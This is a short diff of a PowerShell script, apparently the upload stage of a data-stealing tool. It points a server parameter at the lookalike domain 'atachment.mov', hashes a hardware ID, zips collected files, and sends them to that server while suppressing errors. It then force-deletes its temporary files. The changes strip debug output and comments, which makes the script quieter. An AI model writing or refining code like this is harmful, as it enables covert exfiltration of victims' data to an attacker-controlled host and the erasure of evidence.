@@ -1,5 +1,5 @@
 param(
-    [string]$Server = "https://atachment.mov"  # your VPS address
+    [string]$Server = "https://atachment.mov"  # my VPS address
 )
 
 # ----------------------------
@@ -102,8 +102,6 @@ $bytes = [System.Text.Encoding]::UTF8.GetBytes($hwidJson)
 $hwidHash = [System.BitConverter]::ToString($sha256.ComputeHash($bytes)) -replace "-", ""
 $hwidHash | Out-File (Join-Path $tempDir "HWID_Hash.txt") -Encoding UTF8
 
-#Write-Host "[*] HWID generated: $hwidHash"
-
 # ----------------------------
 # Zip everything
 # ----------------------------
@@ -121,8 +119,5 @@ try {
     # Write-Host "[!] Failed to send logs: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# ----------------------------
-# Cleanup
-# ----------------------------
 Remove-Item $tempDir -Recurse -Force
 Remove-Item $zipPath -Force
